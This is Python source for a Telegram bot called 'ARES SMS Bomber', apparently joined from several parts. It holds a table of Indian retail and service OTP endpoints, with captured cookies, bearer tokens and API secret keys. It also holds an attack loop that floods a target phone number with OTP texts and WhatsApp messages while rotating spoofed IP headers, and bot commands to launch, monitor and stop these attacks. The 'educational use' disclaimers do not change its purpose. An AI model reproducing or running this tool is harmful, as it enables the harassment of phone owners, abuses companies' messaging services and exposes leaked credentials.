            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Cookie": "X-Magento-Vary=7253ab9fc388bf858e88f6c5b3ad9d20efd0c2afa76c88022c82f5b7e12d8dd8; PHPSESSID=0bf7f5d8d3af44bc50aeda7b8b51fa8b; _gcl_au=1.1.1097443806.1745238499; _ga_3YTXH403VL=GS1.1.1745238499.1.0.1745238499.60.0.1102057604; _ga=GA1.1.192685670.1745238500; _fbp=fb.1.1745238506999.831971844971570496; fastrr_uuid=1b20f947-fed8-49e5-a719-e9ffad876e6d; fastrr_usid=1b20f947-fed8-49e5-a719-e9ffad876e6d-1745238507912; sociallogin_referer_store=https://www.cossouq.com/?srsltid=AfmBOoqQ0GRbpH-mXrUJ5b6tAC5W6ZyAzFJRI7l0mbnNQ9i5LMpAIvh1; form_key=YJhK7hwSLfPsrlIo; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; cf_clearance=j19CDG8K1gn1L1h7_4VZCKUooUZtTYpxeBUC2Lux3Zo-1745238510-1.2.1.1-Cqvbh_RiIRgsCZKrpq.nnB.sx3LbLUw3MdbYfWzupniUjlhOYxqxVZSfwZfdm39IFuJrct6OeXj60cIyZotm9G1qptUBqCEHw_A5XjlhmtZ5_52EG9n0r0q9rhTZ.qT6ao7jj8k4RANRvHshdV47fXpz7BmvvvHl856x.tnP32auJyOBAP0KAw9SyZSXAC3XhR2CWs._08I21k90gtw3Qv8tjjlbqQjQNV9_ctDV6j2J_kh4xzhzQQQ2LrbuxtHjF_AjllteBD7a4BwuGq9roN0N48thQC3_meeP8irRIXLN7ndRE4vnvQJgrVN9iE9DxDhphhKGRt4xiZthB9XpZvWgH1u62Q5otw9kyTp75bs; section_data_ids={%22merge-quote%22:1745238511%2C%22cart%22:1745238512%2C%22custom_section%22:1745238513}; private_content_version=1c35968280f95365b50e1c62ebfbdb01"
        },
        "data": lambda phone: f"mobilenumber={phone}&otptype=register&resendotp=0&email=&oldmobile=0"
    },
    {
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "authorization": "Bearer null",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://app.shiprocket.in",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://app.shiprocket.in/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "gk-version": "20250421065835697",
            "gk-timestamp": "58174641",
            "sec-ch-ua-platform": "Android",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc0NTIzOTI0MywiZXhwIjoxNzQ1MjM5MzAzfQ.-gV0sRUkGD4SPGPUUJ6XBanoDCI7VSNX99oGsUU5nWk",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "gk-signature": "076108",
            "gk-udf-1": "951",
            "sec-ch-ua-mobile": "?1",
            "gk-request-id": "a0cecd38-e690-48d5-ab80-b9d2feed3761",
            "gk-merchant-id": "19g6jlc658iad",
            "origin": "https://pdp.gokwik.co",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://pdp.gokwik.co/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    }
])
# ares_tg_bot_part2c.py - API_CONFIGS (Remaining 11 APIs)
API_CONFIGS.extend([
    {
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false",
        "method": "GET",
        "headers": {
            "Host": "www.jockey.in",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "Referer": "https://www.jockey.in/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9,bn;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5"
        },
        "data": None
    },
    {
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {
            "Host": "www.jockey.in",
            "Accept": "*/*",
            "X-Requested-With": "pure.lite.browser",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.jockey.in/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Cookie": "secure_customer_sig=; localization=IN; _tracking_consent=%7B%22con%22%3A%7B%22CMP%22%3A%7B%22a%22%3A%22%22%2C%22m%22%3A%22%22%2C%22p%22%3A%22%22%2C%22s%22%3A%22%22%7D%7D%2C%22v%22%3A%222.1%22%2C%22region%22%3A%22INMP%22%2C%22reg%22%3A%22%22%2C%22purposes%22%3A%7B%22p%22%3Atrue%2C%22a%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22sale_of_data_region%22%3Afalse%2C%22consent_id%22%3A%220076A26B-593e-4179-adb7-7df1a1acfdaa%22%7D; _shopify_y=43a0be93-7c1c-4f33-bfad-c1477bb4a5c4; wishlist_id=7531056362767gn1bc6na3; bookmarkeditems={\"items\":[]}; wishlist_customer_id=0; _orig_referrer=; _landing_page=%2F%3Fsrsltid%3DAfmBOopQUXJnULldDNJDov4FZosiMLiJWWydft0OHn_M2nopq0YOyBr7; _shopify_sa_p=; cart=Z2NwLWFzaWEtc291dGhlYXN0MTowMUpHWUhOUkZWS0RNWFlQRTY0S1dFWTA1Sw%3Fkey%3D38a52d30f4363b9ee4e8ffea783532bb; keep_alive=c4db46b0-bfba-48e7-878e-f6e81085a234; cart_ts=1736192207; cart_sig=04c8cecd093ed714d4a4dd68dfcc4020; cart_currency=INR; _shopify_s=83810dbb-190b-45ae-bb0a-de2fbf1090ed; _shopify_sa_t=2025-01-06T19%3A36%3A47.278Z"
        },
        "data": None
    },
    {
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {
            "Host": "prodapi.newme.asia",
            "Content-Length": lambda data: str(len(data)),
            "Timestamp": lambda: str(int(time.time() * 1000)),
            "Delivery-Pincode": "",
            "Caller": "web_app",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://newme.asia",
            "Referer": "https://newme.asia/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9,bn;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5"
        },
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
    },
    {
        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {
            "Host": "api.univest.in",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.9.1"
        },
        "data": None
    },
    {
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.9.1"
        },
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    },
    {
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Platform": "web",
            "Origin": "https://www.foxy.in",
            "X-Requested-With": "pure.lite.browser",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.foxy.in/onboarding",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{phone}"}},"device":null,"invite_code":""}}'
    },
    {
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {
            "Device-Id": "5df83c463f0ff8ff",
            "Flavour": "android",
            "Locale": "en",
            "Version": "1382",
            "Client-Id": "androidp",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "okhttp/4.9.3"
        },
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },
    {
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Platform": "web",
            "Origin": "https://www.foxy.in",
            "X-Requested-With": "pure.lite.browser",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.foxy.in/onboarding",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
    },
    {
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://smytten.com",
            "X-Requested-With": "pure.lite.browser",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://smytten.com/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "Desktop-Request": "false",
            "Web-Version": "1",
            "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f",
            "Request-Type": "web",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"ad_id":"","device_info":{{}},"device_id":"","app_version":"","device_token":"","device_platform":"web","phone":"{phone}","email":"sdhabai09@gmail.com"}}'
    },
    {
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://www.wakefit.co",
            "X-Requested-With": "pure.lite.browser",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.wakefit.co/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "API-Secret-Key": "ycq55IbIjkLb",
            "API-Token": "c84d563b77441d784dce71323f69eb42",
            "My-Cookie": "undefined"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","whatsapp_opt_in":1}}'
    },
    {
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Origin": "https://www.caratlane.com",
            "Referer": "https://www.caratlane.com/register",
            "Accept-Encoding": "gzip, deflate, br",
            "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209",
            "X-Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"
        },
        "data": lambda phone: f'{{"query":"\\n        mutation {{\\n            SendOtp( \\n                input: {{\\n        mobile: \\"{phone}\\",\\n        isdCode: \\"91\\",\\n        otpType: \\"registerOtp\\"\\n      }}\\n            ) {{\\n                status {{\\n                    message\\n                    code\\n                }}\\n            }}\\n        }}\\n    "}}'
    }
])
# ares_tg_bot_part3.py
# Continue from previous part

async def bomber_attack(phone, attack_id, user_id, update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ultra-fast bomber attack with Telegram updates"""
    attack_info = AttackInfo(user_id, phone, attack_id)
    active_attacks[attack_id] = attack_info
    
    connector = aiohttp.TCPConnector(
        limit=500,
        limit_per_host=200,
        ttl_dns_cache=300,
        force_close=False,
        enable_cleanup_closed=True
    )
    
    timeout = aiohttp.ClientTimeout(total=1.2, connect=0.8, sock_read=0.8)
    
    try:
        # Send start message
        start_msg = await context.bot.send_message(
            chat_id=user_id,
            text=f"🔥 *ARES ATTACK INITIATED*\n\n"
                 f"🎯 Target: `+91{phone}`\n"
                 f"⚡ Speed: normal\n"
                 f"📊 APIs: 5+\n"
                 f"🆔 Attack ID: `{attack_id}`\n"
                 f"⏰ Start Time: `{datetime.now().strftime('%H:%M:%S')}`\n\n"
                 f"_Initializing connection pool..._",
            parse_mode=ParseMode.MARKDOWN
        )
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={'Connection': 'keep-alive'}
        ) as session:
            
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=start_msg.message_id,
                text=f"🔥 *ARES ATTACK RUNNING*\n\n"
                     f"🎯 Target: `+91{phone}`\n"
                     f"⚡ Speed: normal\n"
                     f"📊 APIs: 5+\n"
                     f"🆔 Attack ID: `{attack_id}`\n\n"
                     f"🔄 Bombing in progress...",
                parse_mode=ParseMode.MARKDOWN
            )
            
            while attack_info.running and attack_id in active_attacks:
                tasks = []
                current_ip = generate_ip()
                
                for config in API_CONFIGS:
                    headers = config["headers"].copy()
                    headers["X-Forwarded-For"] = current_ip
                    headers["Client-IP"] = current_ip
                    
                    # Handle dynamic headers
                    if callable(headers.get("Content-Length")):
                        data = config["data"](phone) if config["data"] else None
                        headers["Content-Length"] = headers["Content-Length"](data)
                    if callable(headers.get("Timestamp")):
                        headers["Timestamp"] = headers["Timestamp"]()
                    
                    # Handle dynamic URLs
                    url = config["url"](phone) if callable(config["url"]) else config["url"]
                    data = config["data"](phone) if config["data"] else None
                    
                    tasks.append(make_api_call(session, url, config["method"], headers, data))
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                current_success = 0
                current_otp_success = 0
                
                for result in results:
                    if isinstance(result, Exception):
                        continue
                        
                    status, response_text = result
                    
                    if status and status < 400:
                        attack_info.successful_requests += 1
                        current_success += 1
                        
                        if response_text and any(keyword in response_text.lower() for keyword in 
                                               ['success', 'sent', 'otp', 'message', 'ok', 'true']):
                            attack_info.real_otp_success += 1
                            current_otp_success += 1
                
                attack_info.total_requests += len(API_CONFIGS)
                
                # Update Telegram every 3 seconds
                current_time = time.time()
                if current_time - attack_info.last_update >= 3:
                    stats = attack_info.get_stats()
                    
                    # Update message with live stats
                    try:
                        await context.bot.edit_message_text(
                            chat_id=user_id,
                            message_id=start_msg.message_id,
                            text=f"🔥 *ARES ATTACK LIVE*\n\n"
                                 f"🎯 Target: `+91{phone}`\n"
                                 f"⚡ Speed: normal\n"
                                 f"📤 Total: `{stats['total']:,}`\n"
                                 f"✅ Success: `{stats['success']:,}`\n"
                                 f"📱 OTPs: `{stats['otps']:,}`\n"
                                 f"📈 Rate: `{stats['success_rate']:.1f}%`\n"
                                 f"⏱️ Duration: `{stats['elapsed']:.0f}s`\n"
                                 f"🆔 ID: `{attack_id}`",
                            parse_mode=ParseMode.MARKDOWN
                        )
                    except:
                        pass
                    
                    attack_info.last_update = current_time
                
                await asyncio.sleep(0.02)
                
    except asyncio.CancelledError:
        attack_info.running = False
    except Exception as e:
        logger.error(f"Attack error: {e}")
        attack_info.running = False
    finally:
        # Clean up and send final stats
        if attack_id in active_attacks:
            del active_attacks[attack_id]
        
        if attack_info.total_requests > 0:
            stats = attack_info.get_stats()
            
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"✅ *ATTACK COMPLETED*\n\n"
                         f"🎯 Target: `+91{phone}`\n"
                         f"⚡ Avg Speed: normal\n"
                         f"📤 Total Requests: `{stats['total']:,}`\n"
                         f"✅ Successful: `{stats['success']:,}`\n"
                         f"📱 OTP Sent: `{stats['otps']:,}`\n"
                         f"📈 Success Rate: `{stats['success_rate']:.1f}%`\n"
                         f"⏱️ Duration: `{stats['elapsed']:.1f}s`\n\n"
                         f"_ARES Attack Finished Successfully_",
                    parse_mode=ParseMode.MARKDOWN
                )
            except:
                pass
# ares_tg_bot_part4.py
# Continue from previous part

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    
    banner = """╔══════════════════════════════════════════╗
                ║            ARES SMS BOMBER               ║
                ║               by Ares                    ║
                ╚══════════════════════════════════════════╝

🚀 Welcome to the Ultimate SMS Bomber!
⚠️ For educational/testing purposes only!

Please enter the phone number (without country code):
Example: 9876543210
"""
    
    keyboard = [
        [InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack")],
        [InlineKeyboardButton("📊 MY ATTACKS", callback_data="my_attacks")],
        [InlineKeyboardButton("⚙️  SETTINGS", callback_data="settings")],
        [InlineKeyboardButton("❓ HELP", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"`{banner}`\n\n"
        f"👤 *User:* @{user.username}\n"
        f"🆔 *ID:* `{user.id}`\n"
        f"📅 *Joined:* `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
        f"⚠️ *DISCLAIMER:* This bot is for EDUCATIONAL PURPOSES only.\n"
        f"Do NOT misuse this tool for harassment or illegal activities.\n\n"
        f"📋 *Commands:*\n"
        f"/start - Start bot\n"
        f"/attack - Start OTP attack\n"
        f"/status - Check attack status\n"
        f"/stop - Stop all attacks\n"
        f"/stats - Show bot statistics\n"
        f"/help - Show help information",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /attack command"""
    user_id = update.effective_user.id
    
    # Check for existing attacks
    user_attacks = [a for a in active_attacks.values() if a.user_id == user_id]
    if user_attacks:
        attack_list = "\n".join([f"• `+91{a.phone}` (ID: {a.attack_id})" for a in user_attacks])
        await update.message.reply_text(
            f"⚠️ *YOU HAVE ACTIVE ATTACKS*\n\n"
            f"{attack_list}\n\n"
            f"Use /stop to stop attacks first.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    await update.message.reply_text(
        "🎯 *ENTER PHONE NUMBER*\n\n"
        "Please enter the 10-digit phone number (without +91):\n"
        "Example: `9876543210`\n\n"
        "_Type /cancel to abort_",
        parse_mode=ParseMode.MARKDOWN
    )
    
    user_sessions[user_id] = {'state': 'awaiting_phone'}

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle user messages"""
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id in user_sessions and user_sessions[user_id]['state'] == 'awaiting_phone':
        if text == '/cancel':
            user_sessions.pop(user_id, None)
            await update.message.reply_text("❌ Attack cancelled.")
            return
        
        # Validate phone number
        if not text.isdigit() or len(text) != 10:
            await update.message.reply_text(
                "❌ *INVALID PHONE NUMBER*\n\n"
                "Must be 10 digits (without +91)\n"
                "Example: `9876543210`\n\n"
                "Try again or /cancel",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        phone = text
        
        # Confirm attack
        keyboard = [
            [
                InlineKeyboardButton("✅ START ATTACK", callback_data=f"confirm_attack_{phone}"),
                InlineKeyboardButton("❌ CANCEL", callback_data="cancel_attack")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"⚠️ *CONFIRM ATTACK*\n\n"
            f"🎯 Target: `+91{phone}`\n"
            f"⚡ Estimated Speed: normal\n"
            f"🔥 unlimited\n"
            f"🛡️ Anti-Detection: Enabled\n\n"
            f"Are you sure you want to start the attack?\n"
            f"_Developer dont take responsiblity if you misuse._",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
        
        user_sessions.pop(user_id, None)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command"""
    user_id = update.effective_user.id
    user_attacks = [a for a in active_attacks.values() if a.user_id == user_id]
    
    if not user_attacks:
        await update.message.reply_text(
            "📭 *NO ACTIVE ATTACKS*\n\n"
            "You don't have any active attacks.\n"
            "Use /attack to start one.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    status_text = "🔥 *YOUR ACTIVE ATTACKS*\n\n"
    
    for attack in user_attacks:
        stats = attack.get_stats()
        status_text += (
            f"🎯 Target: `+91{attack.phone}`\n"
            f"🆔 ID: `{attack.attack_id}`\n"
            f"⚡ Speed: `{stats['rps']:.1f}/sec`\n"
            f"📤 Requests: `{stats['total']:,}`\n"
            f"📱 OTPs: `{stats['otps']:,}`\n"
            f"⏱️ Running: `{stats['elapsed']:.0f}s`\n"
            f"────────────────────\n"
        )
    
    keyboard = [[InlineKeyboardButton("🛑 STOP ALL ATTACKS", callback_data="stop_all_attacks")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        status_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stop command"""
    user_id = update.effective_user.id
    stopped_count = 0
    
    for attack_id, attack_info in list(active_attacks.items()):
        if attack_info.user_id == user_id:
            attack_info.running = False
            if attack_info.task:
                attack_info.task.cancel()
            del active_attacks[attack_id]
            stopped_count += 1
    
    if stopped_count > 0:
        await update.message.reply_text(
            f"✅ *STOPPED {stopped_count} ATTACK(S)*\n\n"
            f"All your attacks have been stopped.",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await update.message.reply_text(
            "📭 *NO ACTIVE ATTACKS*\n\n"
            "No attacks to stop.",
            parse_mode=ParseMode.MARKDOWN
        )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stats command"""
    total_attacks = len(active_attacks)
    total_requests = sum(a.total_requests for a in active_attacks.values())
    total_otps = sum(a.real_otp_success for a in active_attacks.values())
    
    stats_text = f"""
📊 *ARES BOT STATISTICS*

🤖 Bot Status: Online
👥 Active Users: {len(set(a.user_id for a in active_attacks.values()))}
🔥 Active Attacks: {total_attacks}
📡 Total APIs: 5+
⚡ Max Speed: normal
📤 Total Requests: {total_requests:,}
📱 Total OTPs Sent: {total_otps:,}


⚠️ *EDUCATIONAL USE ONLY*
"""
    
    await update.message.reply_text(stats_text, parse_mode=ParseMode.MARKDOWN)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    help_text = """
❓ *ARES BOT HELP GUIDE*

📋 *AVAILABLE COMMANDS:*
/start - Start the bot and show menu
/attack - Start a new OTP attack
/status - Check your active attacks
/stop - Stop all your attacks
/stats - Show bot statistics
/help - Show this help message

🎯 *HOW TO USE:*
1. Use /attack or click "START ATTACK"
2. Enter 10-digit phone number (without +91)
3. Confirm the attack
4. Bot will start bombing immediately
5. Live updates every 3 seconds
6. Use /status to check progress
7. Use /stop to stop attacks

⚡ *FEATURES:*
• Ultra-fast parallel execution
• 5+ active OTP services
• Real-time statistics
• Auto IP rotation
• Anti-detection headers
• Connection pooling
• Error handling

⚠️ *IMPORTANT NOTES:*
• This bot is for EDUCATIONAL purposes only
• Do not use for harassment or illegal activities
• The bot owner is not responsible for misuse
• Use at your own risk
• Respect others' privacy
"""
    
    keyboard = [
        [InlineKeyboardButton("🚀 START ATTACK NOW", callback_data="start_attack")],
        [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        help_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )
# ares_tg_bot_part5.py
# Continue from previous part

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "start_attack":
        # Check for existing attacks
        user_attacks = [a for a in active_attacks.values() if a.user_id == user_id]
        if user_attacks:
            attack_list = "\n".join([f"• `+91{a.phone}`" for a in user_attacks])
            await query.edit_message_text(
                text=f"⚠️ *YOU HAVE ACTIVE ATTACKS*\n\n"
                     f"{attack_list}\n\n"
                     f"Use /stop to stop attacks first.",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        await query.edit_message_text(
            text="🎯 *ENTER PHONE NUMBER*\n\n"
                 "Please enter the 10-digit phone number (without +91):\n"
                 "Example: `9876543210`\n\n"
                 "_Type /cancel to abort_",
            parse_mode=ParseMode.MARKDOWN
        )
        
        user_sessions[user_id] = {'state': 'awaiting_phone'}
        
    elif data == "my_attacks":
        user_attacks = [a for a in active_attacks.values() if a.user_id == user_id]
        
        if not user_attacks:
            keyboard = [[InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                text="📭 *NO ACTIVE ATTACKS*\n\n"
                     "You don't have any active attacks.\n"
                     "Start one now!",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
            return
        
        status_text = "🔥 *YOUR ACTIVE ATTACKS*\n\n"
        
        for attack in user_attacks:
            stats = attack.get_stats()
            status_text += (
                f"🎯 Target: `+91{attack.phone}`\n"
                f"🆔 ID: `{attack.attack_id}`\n"
                f"⚡ Speed: `{stats['rps']:.1f}/sec`\n"
                f"📤 Requests: `{stats['total']:,}`\n"
                f"📱 OTPs: `{stats['otps']:,}`\n"
                f"⏱️ Running: `{stats['elapsed']:.0f}s`\n"
                f"────────────────────\n"
            )
        
        keyboard = [
            [InlineKeyboardButton("🛑 STOP ALL", callback_data="stop_all_attacks")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_to_main")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            text=status_text,
            parse_mode=ParseMode.MARKDOWN,
